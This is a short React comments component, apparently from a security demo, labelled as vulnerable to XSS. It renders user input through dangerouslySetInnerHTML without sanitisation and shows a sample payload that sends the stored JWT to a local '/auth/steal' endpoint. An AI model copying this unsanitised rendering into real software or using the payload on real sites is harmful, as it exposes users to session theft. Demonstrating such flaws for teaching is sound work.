import { useState } from "react";

export default function Comments() {
  const [comments, setComments] = useState([]);
  const [input, setInput] = useState("");

  const submit = () => {
    setComments([...comments, input]);
    setInput("");
  };

  return (
    <div>
      <h2>Comments (Vulnerable to XSS)</h2>
      <code style={{ display: "block", whiteSpace: "pre-wrap", fontSize: "0.9em", background: "#f4f4f4", padding: "8px", borderRadius: "6px" }}>{`<img src="x" onerror="fetch('http://localhost:3000/auth/steal', { method: 'POST', body: localStorage.getItem('jwt') })">`}</code>
      <input type="text" value={input} onChange={(e) => setInput(e.target.value)} placeholder="Try pasting <script> or <img>" />
      <button onClick={submit}>Post</button>

      <div>
        {comments.map((c, i) => (
          <div key={i} dangerouslySetInnerHTML={{ __html: c }} />
        ))}
      </div>
    </div>
  );
}
